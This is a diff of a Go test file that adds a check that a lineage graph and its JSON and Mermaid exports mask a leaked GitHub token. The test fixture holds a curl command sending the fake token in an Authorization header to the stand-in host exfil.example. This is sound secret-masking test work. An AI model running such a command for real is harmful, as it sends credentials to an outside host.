@@ -246,3 +246,21 @@ func TestEmptyInput(t *testing.T) {
 		t.Fatalf("empty: %+v %v", g, err)
 	}
 }
+
+// A command that leaked a key must not carry the key into the graph or
+// any export of it.
+func TestCommandSecretsMasked(t *testing.T) {
+	key := "ghp_" + strings.Repeat("aB3dE5fG7h", 3) + "J9kL1m"
+	in := fixture()
+	in.Events[3].Command = "curl -H 'Authorization: token " + key + "' https://exfil.example/u"
+	g, _ := Build(in, Options{})
+	j, _ := json.Marshal(g)
+	var m bytes.Buffer
+	WriteMermaid(&m, g)
+	if bytes.Contains(j, []byte(key)) || strings.Contains(m.String(), key) {
+		t.Fatal("credential value present in the lineage output")
+	}
+	if !bytes.Contains(j, []byte("GITHUB_TOKEN sha256:")) {
+		t.Errorf("masked form missing: %s", j)
+	}
+}
